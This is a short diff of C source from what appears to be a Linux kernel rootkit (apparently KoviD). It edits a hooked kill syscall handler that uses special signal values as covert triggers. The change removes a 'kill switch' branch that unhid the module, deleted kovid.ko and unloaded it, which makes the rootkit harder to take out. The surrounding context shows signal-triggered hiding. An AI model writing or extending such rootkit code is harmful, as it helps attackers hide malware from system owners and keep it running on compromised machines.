@@ -168,13 +168,6 @@ static asmlinkage long m_kill(struct pt_regs *regs)
 		hide_once = true;
 		spin_unlock(&hide_once_spin);
 		prinfo("Cool! Now run your command\n");
-	} else if (888 == pid && SIGCONT == sig) {
-		prinfo("The kill switch button!\n");
-		kv_unhide_mod();
-		{
-			fs_file_rm("./kovid.ko");
-		}
-		module_put_and_exit(0);
 	}
 
 leave:
